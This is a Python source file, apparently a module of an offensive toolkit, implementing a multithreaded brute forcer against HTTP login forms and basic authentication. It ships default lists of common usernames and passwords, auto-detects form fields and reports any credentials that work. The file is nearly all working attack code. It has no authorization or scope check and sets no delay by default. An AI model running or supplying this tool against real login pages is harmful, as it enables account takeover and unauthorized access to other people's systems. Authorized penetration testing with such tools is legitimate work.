import json
import urllib.request
import urllib.parse
import base64
import concurrent.futures
from utils.output import section, info, success, warning, error, result, table


class LoginBrute:
    description = "HTTP form/basic/digest authentication brute forcer"

    COMMON_USERS = [
        "admin", "root", "administrator", "user", "test", "guest",
        "manager", "demo", "sysadmin", "operator", "webmaster",
        "backup", "support", "info", "admin1", "admin123", "a",
    ]

    COMMON_PASSWORDS = [
        "admin", "password", "123456", "12345678", "qwerty", "admin123",
        "letmein", "welcome", "passw0rd", "P@ssw0rd", "12345", "password1",
        "admin123", "root", "toor", "changeme", "secret", "password123",
        "admin1", "test", "guest", "1234", "pass", "p@ssword",
        "administrator", "Passw0rd", "Pass123", "admin!", "root123",
    ]

    @staticmethod
    def run(url="", username="", usernames="", password="", passwords="",
             user_file="", pass_file="", method="auto", field_user="", field_pass="",
             auth_type="", success_str="", fail_str="", threads=10, timeout=15, delay=0, **kwargs):
        section("Login Brute Forcer")

        if not url:
            error("No URL provided (use --url)")
            return {"error": "no URL"}

        # Build user list
        userlist = []
        if username:
            userlist.append(username)
        if usernames:
            userlist.extend(u.strip() for u in usernames.split(",") if u.strip())
        if user_file:
            try:
                with open(user_file) as f:
                    userlist.extend(line.strip() for line in f if line.strip())
                info(f"Loaded {len(userlist)} users from {user_file}")
            except:
                warning(f"Cannot open {user_file}")
        if user_file or usernames or username:
            pass
        else:
            userlist = LoginBrute.COMMON_USERS
            info(f"Using {len(userlist)} common usernames")

        # Build password list
        passlist = []
        if password:
            passlist.append(password)
        if passwords:
            passlist.extend(p.strip() for p in passwords.split(",") if p.strip())
        if pass_file:
            try:
                with open(pass_file) as f:
                    passlist.extend(line.strip() for line in f if line.strip())
                info(f"Loaded {len(passlist)} passwords from {pass_file}")
            except:
                warning(f"Cannot open {pass_file}")
        if pass_file or passwords or password:
            pass
        else:
            passlist = LoginBrute.COMMON_PASSWORDS
            info(f"Using {len(passlist)} common passwords")

        # Parse URL to detect auth type
        parsed = urllib.parse.urlparse(url)
        auth_type = auth_type.lower() if auth_type else ""
        if not auth_type:
            if "@" in parsed.netloc:
                auth_type = "basic"
            elif "login" in url.lower() or "wp-login" in url.lower() or "signin" in url.lower():
                auth_type = "form"
            else:
                auth_type = "form"
            info(f"Auto-detected auth type: {auth_type}")

        result_data = {
            "url": url,
            "auth_type": auth_type,
            "attempts": 0,
            "found": [],
            "errors": [],
        }

        info(f"Starting brute force with {len(userlist)} users x {len(passlist)} passwords = {len(userlist) * len(passlist)} combinations")

        if auth_type == "basic":
            LoginBrute._brute_basic(url, userlist, passlist, timeout, delay, result_data)
        elif auth_type == "form":
            LoginBrute._brute_form(url, userlist, passlist, field_user, field_pass, success_str, fail_str, timeout, delay, result_data)
        else:
            LoginBrute._brute_basic(url, userlist, passlist, timeout, delay, result_data)

        section("Brute Force Complete")
        if result_data["found"]:
            success(f"Found {len(result_data['found'])} valid credentials!")
            table(["Username", "Password", "Type"], [[f["username"], f["password"], f.get("type", "form")] for f in result_data["found"]])
        else:
            info(f"No valid credentials found after {result_data['attempts']} attempts")

        return result_data

    @staticmethod
    def _brute_form(url, userlist, passlist, field_user, field_pass, success_str, fail_str, timeout, delay, result_data):
        import time

        if not field_user or not field_pass:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    html = resp.read().decode("utf-8", errors="replace")
                    import re
                    input_fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html)
                    if input_fields:
                        info(f"Detected form fields: {', '.join(input_fields[:6])}")
                    if not field_user and len(input_fields) >= 1:
                        field_user = input_fields[0]
                    if not field_pass and len(input_fields) >= 2:
                        field_pass = input_fields[1]
                    if not field_user:
                        field_user = "username"
                    if not field_pass:
                        field_pass = "password"
            except:
                if not field_user:
                    field_user = "username"
                if not field_pass:
                    field_pass = "password"

            info(f"Using field names: {field_user}=<user>, {field_pass}=<pass>")

        if not success_str and not fail_str:
            success_str = "dashboard"
            fail_str = "invalid"

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for user in userlist:
                for pwd in passlist:
                    if delay:
                        time.sleep(delay)
                    future = executor.submit(
                        LoginBrute._try_form, url, user, pwd,
                        field_user, field_pass, success_str, fail_str, timeout
                    )
                    futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                result_data["attempts"] += 1
                res = future.result()
                if res:
                    result_data["found"].append(res)
                    success(f"VALID: {res['username']}:{res['password']}")

    @staticmethod
    def _try_form(url, user, pwd, field_user, field_pass, success_str, fail_str, timeout):
        try:
            data = urllib.parse.urlencode({field_user: user, field_pass: pwd}).encode()
            req = urllib.request.Request(
                url,
                data=data,
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                if resp.status == 302:
                    return {"username": user, "password": pwd, "type": "form", "reason": "302 redirect"}
                if fail_str and fail_str.lower() not in body.lower():
                    return {"username": user, "password": pwd, "type": "form", "reason": "no fail string"}
                if success_str and success_str.lower() in body.lower():
                    return {"username": user, "password": pwd, "type": "form", "reason": "success string found"}
        except urllib.error.HTTPError as e:
            if e.code == 302:
                return {"username": user, "password": pwd, "type": "form", "reason": "302 redirect (HTTPError)"}
        except:
            pass
        return None

    @staticmethod
    def _brute_basic(url, userlist, passlist, timeout, delay, result_data):
        import concurrent.futures

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for user in userlist:
                for pwd in passlist:
                    future = executor.submit(LoginBrute._try_basic, url, user, pwd, timeout)
                    futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                result_data["attempts"] += 1
                res = future.result()
                if res:
                    result_data["found"].append(res)
                    success(f"VALID: {res['username']}:{res['password']}")

    @staticmethod
    def _try_basic(url, user, pwd, timeout):
        try:
            creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    return {"username": user, "password": pwd, "type": "basic"}
        except urllib.error.HTTPError as e:
            if e.code == 200:
                return {"username": user, "password": pwd, "type": "basic"}
        except:
            pass
        return None
